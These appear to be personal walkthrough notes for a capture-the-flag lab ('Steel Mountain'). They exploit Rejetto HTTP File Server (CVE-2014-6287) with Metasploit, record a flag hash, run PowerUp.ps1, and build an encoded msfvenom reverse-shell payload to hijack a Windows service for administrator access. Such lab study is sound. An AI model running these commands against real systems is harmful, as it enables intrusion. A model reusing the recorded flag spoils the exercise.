name : Bill Harper
other port running on http server : 8080
Rejetto HTTP File Server
search that server on exploit.db -> CVE 2014-6287 

using metaploit -> search 2014-6287  -> set up and run exploit.
move the directory mention -> dir to list all the file -> type 'file name ' to execute the content -> `b04763b6fcf51fcd7c13abc7db4fd365`
download script : wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
this scirpt use to evaluate a Windows machine and determine any abnormalities.

back to meterpreter and upload the script `upload /home/kali/Downloads/THM/Steel_Mountain/PowerUp.ps1`
loading powershell and open : `load power shell ` `powershell_shell`
following the command mentions -> `AdvancedSystemCareService9`

create a payload : `msfvenom -p windows/shell_reverse_tcp LHOST=10.8.85.62 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe`
then upload to meterpreter.( need move to  'C:\Program Files (x86)\IObit\')

move then restart the server :

sc stop AdvancedSystemCareService9

sc start AdvancedSystemCareService9

file root.txt is located in : `c:\users\administrator\desktop\`

download file https://www.exploit-db.com/exploits/39161 and change tun0 ip.

downloasd winPEAS : wget https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/a17f91745cafc5fa43a428d766294190c0ff70a1/winPEAS/winPEASexe/binaries/x86/Release/winPEASx86.exe

